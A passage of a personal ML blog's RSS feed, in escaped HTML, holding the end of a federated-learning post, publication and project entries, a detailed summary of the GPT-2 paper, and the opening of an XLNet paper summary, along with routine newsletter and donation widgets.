&lt;li&gt;&lt;strong&gt;Massively distributed&lt;/strong&gt; - Number of users are much more than the average number of examples per client.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Limited communication&lt;/strong&gt; - Devices are frequently offline and are on slow or expensive connections.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-perform-federated-optimization&#34;&gt;How to perform Federated Optimization?&lt;/h3&gt;
&lt;p&gt;In this blog post, I won&amp;rsquo;t go into the mathematical details regarding the optimization techniques used in Federated Learning. However, we will be discussing the high-level overview of how training is performed. The steps are as follows -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There is a fixed set of &lt;em&gt;K&lt;/em&gt; clients, each with a fixed local dataset.&lt;/li&gt;
&lt;li&gt;At the beginning of each round, a random fraction &lt;em&gt;C&lt;/em&gt; of clients is selected, and the server sends the current global algorithm state to each of these clients (e.g., the current model parameters).&lt;/li&gt;
&lt;li&gt;Only a fraction of clients is selected for efficiency, as experiments show diminishing returns for adding more clients beyond a certain point.&lt;/li&gt;
&lt;li&gt;Each selected client then performs local computation based on the global state and its local dataset, and sends an update to the server.&lt;/li&gt;
&lt;li&gt;The server then applies these updates to its global state, and the process repeats.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenges&#34;&gt;Challenges&lt;/h2&gt;
&lt;p&gt;In general, for ML tasks, and in data centres, the costs of compute is what is the most important - GPUs are used to lower the computation cost.
In Federated Learning, the communication costs somewhat dominate.&lt;/p&gt;
&lt;p&gt;But what do communication costs mean here?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Upload bandwidths in mobiles (globally) is limited to 1 MB/s or less.&lt;/li&gt;
&lt;li&gt;Clients volunteer only if the charged, plugged-in and on free/unmetered WiFi connections.&lt;/li&gt;
&lt;li&gt;Each client participates in only a small number of rounds per day.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In Federated Learning, computation is not much of an issue because the dataset size on each device will be relatively much less and modern smartphones now have processors fast enough to do those computations locally. So, the goal becomes to use additional computation in order to decrease the number of rounds of communication needed to train a model.&lt;/p&gt;
&lt;p&gt;So, the goal becomes to use additional computation in order to lower the number of rounds of communication needed to train the model.&lt;/p&gt;
&lt;p&gt;There are two approaches which can be adopted for this -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Increased parallelism&lt;/em&gt; -  More clients are used which work independently between each communication round.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Increased computation on each client&lt;/em&gt; - Rather than performing a simple computation like gradient calculation, each client performs a more complex calculation between each communication round.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In practice, major speedups are obtained when computation on each client is improved, once a minimum level of parallelism over clients is achieved.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I wrote a Twitter thread on this topic as well - do give it a like/follow me if you liked the article.&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;I recently started reading about Privacy-preserving ML, as this has been a topic that has always interested me.&lt;br&gt;I hope to share my learnings here on Twitter.&lt;br&gt;&lt;br&gt;I started with Federated Learning and here&amp;#39;s a detailed thread that will give you a high-level idea of FL🧵&lt;/p&gt;&amp;mdash; Shreyansh Singh (@shreyansh_26) &lt;a href=&#34;https://twitter.com/shreyansh_26/status/1462262151209381888?ref_src=twsrc%5Etfw&#34;&gt;November 21, 2021&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;This is all for now. Thanks for reading!&lt;/p&gt;
&lt;p&gt;In my next post, I&amp;rsquo;ll share a mathematical explanation as to how optimization (learning) is done in a Federated Learning setting. I will also explain some experimental results that have been published.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MeTGAN: Memory efficient Tabular GAN for high cardinality categorical datasets</title>
      <link>https://shreyansh26.github.io/publication/metgan/</link>
      <pubDate>Sun, 26 Sep 2021 19:52:05 +0530</pubDate>
      <guid>https://shreyansh26.github.io/publication/metgan/</guid>
      <description></description>
    </item>
    
    <item>
      <title>CuRL: Coupled Representation Learning of Cards and Merchants to Detect Transaction Frauds</title>
      <link>https://shreyansh26.github.io/publication/curl-fraud/</link>
      <pubDate>Sun, 26 Sep 2021 19:34:07 +0530</pubDate>
      <guid>https://shreyansh26.github.io/publication/curl-fraud/</guid>
      <description></description>
    </item>
    
    <item>
      <title>ML Optimizers in JAX</title>
      <link>https://shreyansh26.github.io/project/jax-optimizers/</link>
      <pubDate>Sun, 26 Sep 2021 19:19:28 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/jax-optimizers/</guid>
      <description>&lt;p&gt;Implementations of some popular optimizers from scratch for a simple model i.e., Linear Regression on a dataset of 5 features. The goal of this project was to understand how these optimizers work under the hood and try to do a toy implementation myself. I also use a bit of JAX magic to perform the differentiation of the loss function w.r.t to the weights and the bias without explicitly writing their derivatives as a separate function. This can help to generalize this notebook for other types of loss functions as well.&lt;/p&gt;
&lt;p&gt;The optimizers I have implemented are -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Batch Gradient Descent&lt;/li&gt;
&lt;li&gt;Batch Gradient Descent + Momentum&lt;/li&gt;
&lt;li&gt;Nesterov Accelerated Momentum&lt;/li&gt;
&lt;li&gt;Adagrad&lt;/li&gt;
&lt;li&gt;RMSprop&lt;/li&gt;
&lt;li&gt;Adam&lt;/li&gt;
&lt;li&gt;Adamax&lt;/li&gt;
&lt;li&gt;Nadam&lt;/li&gt;
&lt;li&gt;Adabelief&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Paper Summary #6 - Language Models are Unsupervised Multitask Learners</title>
      <link>https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/</link>
      <pubDate>Sun, 23 May 2021 16:44:32 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Language Models are Unsupervised Multitask Learners&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://cdn.openai.com/better-language-models/language_models_are_unsupervised_multitask_learners.pdf&#34;&gt;https://bit.ly/3vgaVJc&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Alec Radford, Jeffrey Wu, Rewon Child, David Luan, Dario Amodei, Ilya Sutskever  &lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/openai/gpt-2&#34;&gt;https://github.com/openai/gpt-2&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I also made an annotated version of the paper which you can find &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/GPT2.pdf&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper demonstrates that language models begin to learn NLP tasks like question answering, machine translation, reading comprehension and summarization without any explicit supervision. The results shown are obtained after training the model on a new dataset of millions of web pages called WebText. GPT-2 is a 1.5 billion parameter model that achieves SOTA on 7 out of 8 LM tasks in a zero-shot setting. The paper proves that it is possible to build NLP systems that learn to perform tasks from the naturally occurring demonstrations of the tasks in text.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;The main motivation arises from the fact that current systems are narrow experts rather than competent generalists. There should be a shift to more general systems which can perform many tasks without the need to manually create and label a training dataset for each one. There have been examples of erratic behaviour of captioning models, reading comprehension systems and image classifiers due to the large variety of possible inputs which can&amp;rsquo;t be modeled using supervised approaches. There is a lack of generalization in current systems.&lt;/p&gt;
&lt;p&gt;Additionally, multitask NLP systems are still in a very early stage mostly due to the fact that it would require a large amount of very specific labeled data for the model to learn from. Although some models use a combination of unsupervised pretraining followed by supervised fine-tuning. GPT-2 wants to do away with any supervised training and show how language models perform in a zero-shot setting on a wide range of tasks.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;Language modeling is usually framed as a unsupervised distribution estimation. It is modeled as a joint probability over the symbols. Due to the sequential order of natural text, this can be written as a product of the conditional probabilities.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/lm.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/lm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Instead of a simple conditional probability distribution for a single task &lt;em&gt;p(output&lt;/em&gt;|&lt;em&gt;input)&lt;/em&gt;. To make a system that can perform multiple tasks, the distribution should be conditioned on the task as well i.e., &lt;em&gt;p(output&lt;/em&gt;|&lt;em&gt;input, task)&lt;/em&gt;. This is usually implemented at the architecture level for example, by using task-specific encoders and decoders. It can also be performed by the language directly.  A translation task can be represented as &lt;tt&gt;(translate to french, english text, french text). &lt;/tt&gt; A reading comprehension can be written as &lt;tt&gt; (answer the question, document, question, answer) &lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;In principle, language modeling will be able to learn these tasks without any supervision of which symbols are to be predicted. Since the global minimum of the unsupervised objective is also the global minimum of the supervised objective (which is based on a subset of the sequence), hence the model can focus only on optimizing for the unsupervised objective. For this, very large models are required, however the learning is slower as compared to the explicitly supervised approaches.&lt;/p&gt;
&lt;p&gt;The authors believe that a large enough language model will begin to learn the tasks embedded within the natural language itself and won&amp;rsquo;t require any additional supervision. For example, given enough text, the model will learn what question answering is, without having to train on question-answering data specifically.&lt;/p&gt;
&lt;h3 id=&#34;dataset&#34;&gt;Dataset&lt;/h3&gt;
&lt;p&gt;A new dataset (self-curated), WebText was used by the authors to train the model. The dataset contained page contents of all the scraped outbound links from Reddit, from posts that received at least 3 karma. They performed HTML cleaning, de-duplication. Also, Wikipedia pages were removed as the test datasets of many of the downstream tasks had information from Wikipedia.&lt;/p&gt;
&lt;h3 id=&#34;input-representation&#34;&gt;Input Representation&lt;/h3&gt;
&lt;p&gt;BytePair encoding, which effectively interpolates between word level inputs for frequent symbol sequences and character level inputs for infrequent symbol sequences was used for tokenizing the corpus. The encoding in the paper was not performed on bytes but Unicode points. This increases the base vocabulary from 256 (in byte mode) to 130,000 (with Unicode).&lt;/p&gt;
&lt;p&gt;The BPE encoding allowed the authors to combine the benefits of word-level LMs with the generality of byte-level approaches. Also, since now the model can assign a probability to any Unicode string, so the LM will be able to be evaluated on any dataset regardless of the pre-processing, tokenization or vocabulary size.&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;hr&gt;
&lt;h3 id=&#34;model&#34;&gt;Model&lt;/h3&gt;
&lt;p&gt;The model is a Transformer decoder architecture, very similar to GPT-1. You can find details &lt;a href=&#34;http://localhost:1313/post/2021-05-02_language_understanding_generative_pretraining/#task-specific-input-transformations&#34;&gt;here&lt;/a&gt;. Some modifications include&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Moving the layer norm to the input of each sub-block and adding an additional layer norm after the final self-attention block.&lt;/li&gt;
&lt;li&gt;A modified initialization which accounts for the accumulation on the residual path with model depth is also used.&lt;/li&gt;
&lt;li&gt;The weights of the residual layers are scaled by 1/sqrt(&lt;em&gt;N&lt;/em&gt;) where &lt;em&gt;N&lt;/em&gt; is the number of residual layers.&lt;/li&gt;
&lt;li&gt;The vocabulary is expanded to 50,257.&lt;/li&gt;
&lt;li&gt;The context size from 512 to 1024 tokens and a larger batch size of 512 is used.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;h3 id=&#34;language-modeling&#34;&gt;Language Modeling&lt;/h3&gt;
&lt;p&gt;This is the primary task the model was trained for. In this category, the model is evaluated on its perplexity score. Some invertible de-tokenizers had to be used on the test set as not all types of text are seen during training for example, standardized text, having tokenization artifacts like shuffled sentences and &amp;lt;UNK&amp;gt; string. A de-tokenizer that removes those artifacts improves the score by 2.5 - 5 perplexity points.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Large improvements were seen on small datasets like Penn Treebank and WikiText-2.&lt;/li&gt;
&lt;li&gt;Large improvements were also seen on LAMBADA and Children&amp;rsquo;s Book Test where long-term dependency had to be measured.&lt;/li&gt;
&lt;li&gt;It failed to perform better than existing approaches for the One Billion Word Benchmark, probably because of it being the largest dataset and having the most destructive pre-processing - the sentence level shuffling which removes all range structure. this makes it difficult for GPT-2 to perform well on it.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;childrens-book-test-cbt&#34;&gt;Children’s Book Test (CBT)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CBT task was to predict which of 10 possible choices for an omitted word is correct.&lt;/li&gt;
&lt;li&gt;Data overlap analysis showed one of the CBT test set books, The Jungle Book by Rudyard Kipling, is in WebText, so the authors report results on the validation set which has no significant overlap.&lt;/li&gt;
&lt;li&gt;GPT-2 achieved SOTA results on both prediction of common nouns (CBT-CN) and the prediction of named entities (CBT-NE).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;lambada&#34;&gt;LAMBADA&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;In LAMBADA, the task is to predict the final word of sentences which require at least 50 tokens of context for a human to successfully predict.&lt;/li&gt;
&lt;li&gt;GPT-2 improved the perplexity from 99.8 (existing SOTA) to 8.6 and the accuracy from 19% to 52.66%.&lt;/li&gt;
&lt;li&gt;Choosing a stopping filter was difficult as many times GPT-2 predicted valid continuations of the sentence but not valid final words. A stop-word filter for this helped improve the accuracy a bit.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/reslm.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/reslm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;winograd-schema-challenge&#34;&gt;Winograd Schema Challenge&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The Winograd Schema challenge aims to measure the capability of a system to perform commonsense reasoning by measuring its ability to resolve ambiguities in the text.&lt;/li&gt;
&lt;li&gt;GPT-2 improves the state of the art accuracy by 7%, achieving 70.70%.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/reswino.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/reswino.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;reading-comprehension&#34;&gt;Reading Comprehension&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The CoQA dataset consists of documents from different domains with natural dialogues in the form of questions and answers. The task tests the reading comprehension capabilities and also the ability to answer questions based on conversation history.&lt;/li&gt;
&lt;li&gt;GPT-2 was evaluated on this task by conditioning on the document, the conversation history and the final token.&lt;/li&gt;
&lt;li&gt;This matched or exceeded the results from 3 of 4 baselines. Also, these models were trained on the 127,000+ question-answer pairs of the training data, which GPT-2 didn&amp;rsquo;t look at.&lt;/li&gt;
&lt;li&gt;GPT-2 didn&amp;rsquo;t perform as well as the BERT SOTA but the score is still impressive since it is a completely unsupervised model.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;summarization&#34;&gt;Summarization&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;GPT-2 didn&amp;rsquo;t perform well on the summarization task on the CNN and Daily Mail dataset.&lt;/li&gt;
&lt;li&gt;It just barely outperforms selecting 3 random sentences from the article.&lt;/li&gt;
&lt;li&gt;Removing the hint reduced the score by 6.4 points indicating that task-specific behaviour was being invoked by natural language.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/ressumm.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/ressumm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;translation&#34;&gt;Translation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The model was conditioned in the following manner - &lt;tt&gt; english sentence = french sentence &lt;/tt&gt; and then after the prompt of &lt;tt&gt; english sentence = &lt;/tt&gt;, the greedy decoding and the first generated sentence was used as the translation.&lt;/li&gt;
&lt;li&gt;However, the performance of the model was very poor, even worse than a word-by-word substitution of the words with their translation.&lt;/li&gt;
&lt;li&gt;However, the French to English task was a bit better, surpassing some unsupervised methods but very far from the best unsupervised method.&lt;/li&gt;
&lt;li&gt;The result is interesting as almost all non-English text was removed from WebText during preprocessing. And the best unsupervised method used 500x more French data.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;question-answering&#34;&gt;Question Answering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The context of the language model is seeded with example question-answer pairs which helps the model infer the short answer style of the dataset.&lt;/li&gt;
&lt;li&gt;However the performance is very poor and the model only answers 4.1% of the questions correctly.&lt;/li&gt;
&lt;li&gt;It was seen that the smaller models could answer around 1% of the questions, indicating that a larger model size helped.&lt;/li&gt;
&lt;li&gt;GPT-2 has an accuracy of 63.1% on the 1% of questions it is most confident in.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/resqa.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/resqa.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h2 id=&#34;generalization-vs-memorization&#34;&gt;Generalization vs Memorization&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;In general, it was seen that all the major datasets have some amount of overlap between the train and the test datasets.&lt;/li&gt;
&lt;li&gt;Even CIFAR-10 has a 3.3% overlap of train and test images.&lt;/li&gt;
&lt;li&gt;To test this, Bloom filters containing 8-grams of WebText training set tokens were created.&lt;/li&gt;
&lt;li&gt;These Bloom filters helped to calculate, given a dataset, the percentage of 8-grams from that dataset that are also found in the WebText training set.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/resoverlap.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/resoverlap.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;The overlap between the datasets&amp;rsquo; train and test set was also very high in some.&lt;/li&gt;
&lt;li&gt;And on analysis, it was seen that removing these overlaps from the train set, resulted in a slight drop in performance across tasks.&lt;/li&gt;
&lt;li&gt;The authors suggest fuzzy string matching or n-gram overlap based de-duplication as important sanity checks when splitting NLP datasets to create the train and test set.&lt;/li&gt;
&lt;li&gt;The performance on both the training and test sets of WebText are similar and improve together as model size is increased&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/resown.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-23_language_models_unsupervised_multitask_learners_gpt2/images/resown.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The authors conclude by saying that since finetuning had helped GPT, the same could be tried for GPT-2 as well for benchmarks such as decaNLP and GLUE. Also, it may be helpful because as BERT pointed out, the inefficiency of unidirectional representations can not absolutely be eliminated by more training data and model size, as could be seen in tasks like summarization, translation and question answering.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/GPT2.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Summary #5 - XLNet: Generalized Autoregressive Pretraining for Language Understanding</title>
      <link>https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/</link>
      <pubDate>Sun, 16 May 2021 14:25:04 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: XLNet: Generalized Autoregressive Pretraining for Language Understanding&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://arxiv.org/pdf/1906.08237.pdf&#34;&gt;https://arxiv.org/pdf/1906.08237.pdf&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Zhilin Yang, Zihang Dai, Yiming Yang, Jaime Carbonell, Ruslan Salakhutdinov, Quoc V. Le&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/zihangdai/xlnet&#34;&gt;https://github.com/zihangdai/xlnet&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper proposes XLNet, a generalized autoregressive pretraining method that enables learning bidirectional contexts over all permutations of the factorization order and overcomes the limitations of BERT due to the autoregressive formulation of XLNet. XLNet incorporates Transformer-XL as the underlying model. It outperforms BERT in 20 NLP tasks like question answering, natural language inference, sentiment analysis and document ranking.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
